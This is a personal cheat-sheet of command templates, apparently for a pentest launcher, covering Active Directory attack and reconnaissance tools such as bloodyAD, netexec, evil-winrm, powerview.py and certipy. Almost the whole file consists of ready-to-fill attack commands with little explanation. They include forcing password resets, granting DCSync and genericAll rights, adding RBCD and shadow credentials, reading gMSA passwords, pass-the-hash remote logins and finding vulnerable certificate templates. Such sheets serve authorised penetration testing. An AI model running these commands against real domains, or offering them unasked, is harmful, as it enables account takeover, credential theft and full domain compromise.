# personal

## bloodyAD - set user password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set password <target-user> <new-password>
```

## bloodyAD - add group member
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add groupMember <target-group> <trustee>
```

## bloodyAD - set user spn
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> serviceprincipalname -v '<service>/<spn>'
```

## bloodyAD - set user attribute
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> <attribute> -v '<value>'
```

## bloodyAD - read gmsa password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get object <target-user> --attr msDS-ManagedPassword
```

## bloodyAD - get writable
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get writable
```

## bloodyAD - get object
#plateform/linux #target/remote #cat/RECON
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get object <target-object>
```

## bloodyAD - get trusts
#plateform/linux #target/remote #cat/RECON
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get trusts --transitive
```

## bloodyAD - set owner
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set owner <target-object> <trustee>
```

## bloodyAD - add computer
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add computer <hostname> <computer-password>
```

## bloodyAD - add dcsync
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add dcsync <target-user>
```

## bloodyAD - add genericAll
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add genericAll <target-user> <trustee>
```

## bloodyad - add rbcd
#plateform/linux #target/remote #cat/attack
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add rbcd <target-object> <service>
```

## bloodyad - add dnsRecord
#plateform/linux #target/remote #cat/attack
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add dnsRecord <dns-name> <dns-data>
```

## bloodyAD - add shadow credential
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add shadowCredentials <target-user>
```

## bloodyAD - add uac
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add uac <target-user> -f <property>
```

## bloodyAD - remove uac
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k remove uac <target-user> -f <property>
```

## bloodyAD - add user
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add user <username> <new-password>
```

## bloodyAD - ldap query
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k get search --filter "<query>" --attr "<attribute>" 
```

## netexec - spider
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> -u <user> -p <password> -d <domain> --spider <share> --pattern . 
```

## netexec - ldap query
#plateform/linux #target/remote #cat/RECON
```
nxc ldap <target-ip> -u <user> -p <password> -d <domain> --query "<query>" "<attribute>" 
```

## netexec - generate hosts file
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> -u <user> -p <password> -d <domain> --generate-hosts-file <output-file>
```

## netexec - generate krb5 file
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> -u <user> -p <password> -d <domain> --generate-krb5-file <output-file>
```

## netexec - generate hosts and krb5 file
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> --generate-hosts-file /etc/hosts && nxc smb <target-ip> --generate-krb5-file /etc/krb5.conf
```

## netexec - generate tgt
#plateform/linux #target/remote #cat/RECON
```
nxc smb <dc-fqdn> -u <user> -p <password> -d <domain> -k --generate-tgt <output-file>
```

## netexec - export users
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> -u <user> -p <password> -d <domain> -k --users-export <output-file>
```

## netexec - use kcache
#plateform/linux #target/remote #cat/RECON
```
nxc <protocol> <dc-fqdn> --use-kcache
```

## netexec - guest login
#plateform/linux #target/remote #cat/RECON
```
nxc smb <target-ip> -u "guest" -p ""
```

## evil-winrm - kerberos auth
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```
evil-winrm -i "<dc-fqdn>" -r "<domain>"
```

## evil-winrm - hash auth
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```
evil-winrm -i "<target-ip>" -u "<user>" -H "<hash>" 
```

## evil-winrm - normal auth
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```
evil-winrm -i "<target-ip>" -u "<user>" -p "<password>" 
```

## mount - mount share credentials
#plateform/linux #target/remote #cat/RECON
```
mount -t "<type>" "<target-ip>":"<mount-point>" <directory> -o username="<user>",password="<password>",domain="<domain>"
```

## mount - mount share
#plateform/linux #target/remote #cat/RECON
```
mount -t "<type>" "<target-ip>":"<mount-point>" <directory>
```

## powerview.py - use
#plateform/linux #target/remote #cat/RECON
```
powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k
```

## powerview.py - use hash
#plateform/linux #target/remote #cat/RECON
```
powerview "<domain>"/"<user>":@"<dc-ip>" -H "<hash>"
```
## powerview.py - use pfx
#plateform/linux #target/remote #cat/RECON
```
powerview "<dc-ip>" --pfx "<pfx-file>"
```

## powerview.py - relay mode
#plateform/linux #target/remote #cat/RECON
```
powerview --relay --relay-host "<target-ip>"
```

## powerview.py - find user description
#plateform/linux #target/remote #cat/RECON
```
powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k  --query "Get-DomainUser -Where 'Description not \"\"' -Properties sAMAccountName,Description"
```

## powerview.py - find group membership
#plateform/linux #target/remote #cat/RECON
```
powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k  --query "Get-DomainGroup -Where 'member contains CN=Users' -Properties member,sAMAccountName"
```

## smbclient-ng - connect kerberos
#plateform/linux #target/remote #cat/RECON
```
smbng -d "<domain>" -u "<user>" -p "<password>" --ip "<target-ip>" --host "<dc-fqdn>" -k --kdcHost "<dc-fqdn>"
```

## smbclient-ng - connect normal
#plateform/linux #target/remote #cat/RECON
```
smbng -d "<domain>" -u "<user>" -p "<password>" --host "<target-ip>"
```

## godap - connect normal login
#plateform/linux #target/remote #cat/RECON
```
godap <target-ip> -u <user> -p <password> -d <domain> -S -I
```

## godap - connect hash login
#plateform/linux #target/remote #cat/RECON
```
godap <target-ip> -u <user> -H <hash> -d <domain> -S -I
```

## exegol-history - add hosts
#plateform/linux #target/remote #cat/CREDS
```
exh add hosts --ip <target-ip> -n <dc-fqdn> -r <role>
```

## exegol-history - add creds
#plateform/linux #target/remote #cat/CREDS
```
exh add creds --ip <target-ip> -u <user> -H $(ntlm_hash <password>) -p <password> -d <domain>
```

## exegol-history - import kdbx creds
#plateform/linux #target/remote #cat/CREDS
```
exh import creds -f <kdbx-file> --format KDBX --kdbx-password <kdbx-password>
```

## certipy - find vulnerable
#plateform/linux #target/remote #cat/ATTACK
```
certipy find -u "<user>"@"<domain>" -p "<password>" -dc-ip "<target-ip>" -k -ns "<dc-ip>" -target "<dc-fqdn>" -vulnerable -stdout
```

